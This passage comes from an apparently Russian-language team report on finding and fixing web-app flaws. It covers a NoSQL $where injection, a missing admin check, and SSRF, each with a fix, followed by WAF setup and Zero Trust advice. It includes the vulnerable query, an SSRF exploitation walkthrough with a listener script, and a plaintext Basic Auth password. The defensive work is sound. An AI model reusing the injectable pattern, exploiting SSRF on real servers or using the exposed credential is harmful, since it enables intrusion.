        response = call_next(request)
        return response
...
app.wsgi_app.add_middleware(CORSMiddleware)

```

    
![](https://i.imgur.com/DhKKv0u.png)

## Уязвимость 4
    
### NoSQL injection: 
```python
{"$where": f"this.username == '{username}' && this.password == '{hashed}'"}
```
Небезопасный string formatting
Для того, чтобы исключить присутсвие данной уязвимости, требуется реализовать логику проверки иначе, т.к. нереляционный тип баз данных часто подверджен атакам из-за меньшего колличество ограничений у запросов, а также большей гибкости.
Более простой альтернативой является фильтрация username (т.к. только оно - user-controlled параметр в запросе к MongoDB).
Fix в метод `register` (на создании юзера):
```python
whitelist = string.ascii_letters + string.digits + '_@!$-:;'
for sym in username:
    if sym not in whitelist:
        return False  # bad username symbol
```    
    

![](https://i.imgur.com/AEQzkKX.png)


## Уязвимость 5
SET_PERMISSIONS ENDPOINT
```python
@app.route('/set_permissions', methods=['POST'])
def set_permissions():
    ... (можно менять permissions любому юзеру, не имея админских прав)
```
    
Fix:
```pyt=
@app.route('/set_permissions', methods=['POST'])
@access.is_admin
def set_permissions():
    ...
```
## Уязвимость 6 
SSRF
Включаем листенер
Устанавливаем урл для отстука
![](https://i.imgur.com/5jEIGez.png)
Записываем свой пейлоад
![](https://i.imgur.com/yZpQ5aj.png)
Видим запрос от сервера на указанный адрес
![](https://i.imgur.com/8qPmlRU.png)
Мы полностью контроллируем тело запроса с помощью base64 пейлоада.
Скрин, где мы получили свой контент, а не null в поле result.
![](https://i.imgur.com/dYfzeyJ.png)
```python=                                                                        
import http.server
import socketserver
from http import HTTPStatus


class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(HTTPStatus.OK)
        self.end_headers()
        self.wfile.write(b'{"a":"hello"}')


httpd = socketserver.TCPServer(('0.0.0.0', 4002), Handler)
httpd.serve_forever()
```

**FIX**:
Для фикса SSRF чаще всего есть два пути (фильтровать нельзя из-за кучи байпасов, reflected SSRF через redirect и т.д.):
    1) Изолировать сервер, с которого идут запросы, если ему жизненно необходимо делать запросы на пользовательские урлы
    2) Избежать этого функционала, по возможности, или если нет возможности изолировать.
В данной ситуации лучше подходит второй способ, как мы и сделали
![](https://i.imgur.com/FHaWwNl.png)
Кроме того, SSRF не дает эксплуатировать WAF(но waf можно забайпасить, так что фикс необходим).

---
    
Кроме того были найдены dos уязвимости, однако они не могут эксплуатироваться для нанесения достаточного ущерба/изменения/получения информации.
    
Dos уязвимости почти всегда принимаются как информативные(некритичные, не угрожающие безопасности сайта)

---
## WAF
Также использовали **Web Application Firewall** ModSecurity для Nginx с OWASP Core Rule Set, он осуществляет поиск не по регулярным выражениям, а по core rules'ам (https://github.com/coreruleset/modsecurity-crs-docker/).
**Это позволило нам закрыть множество попыток эксплуатации уязвимости со стороны чекера, не выявленных на стадии анализа кода.** Например, попытки SQL инъекций
![](https://i.imgur.com/LNFv1rg.png)


Basic Auth: `xss:n5fptvc7CWwjlgJkU8F2`
    
# Вывод
В результате проделанной работы по нахождению и устранению уязвимостей ещё раз подтвердился факт того, что большинство взломов происходят из-за "человеческого фактора" (любитель майнкрафта и отец, который не изолировал рабочее пространство от личного).
Также, обыкновенным пользователям, как Валера, следует надеяться не только на антивирусы и фаерволы, но и отдавать отчет своим действиям.
**Таким образом, мы успешно провели расследование, выполнив все этапы и защитив уязвимое приложение от атак.**


# Как предотвратить подобные инциденты?
В настоящее время широко распространяется принцип Zero Trust, т.е. нет никаких "доверенных" ролей, каждый пользователь или устройство должны подтверждать свои данные каждый раз, когда они запрашивают доступ к какому-либо ресурсу внутри или за пределами сети. Необходимо выдавать минимальное кол-во правил, необходимых для работы (в отношении **ВСЕХ** сотрудников, включая начальство).
Обязательно использовать технологию **VPN** для доступа к корпоративным ресурсам (доступ к самому VPN также защищается 2FA). Логическое развитие VPN - **ZTNA** (Zero Trust Network Access), реализующая микроконтроль до каждого ресурса (гибкие роли пользователей). В случае взлома одного из пользователей в ZTNA осложняется Lateral Movement.
Также не нужно забывать и про организационные меры, такие, как тестирование сотрудников фишинговыми письмами и **строгой политикой доступа**.

Также сейчас изменяется стандартная модель "доступность, целостность, конфеденциальность" в плане первых двух пунктов: технология контейнеризации и построенный на ней подход "инфраструктура как код" меняет отношение к имеющимся ресурсам. Например, раньше ставили main worker сайта на один сервер, базу данных на другой. Это были конкретные ресурсы, конкретные сервера с конкретными характеристиками. Теперь же это ресурсы временные, они могут быть на одном железе, а через час - уже даже в другом датацентре (автоскейлинг). Соответственно, риск отсутствия доступности ("новая версия косячит, а старая не поднимается!" => в любой момент можем вернуться, выкатка новой идёт не сразу на весь масштаб; тестовые инфраструктуры) и целостности ("файл базы данных был удалён каким-то кривым скриптом!" => база-данных-сущность (не просто файл) явно защищена от случайного удаления, нужно его подтверждать).
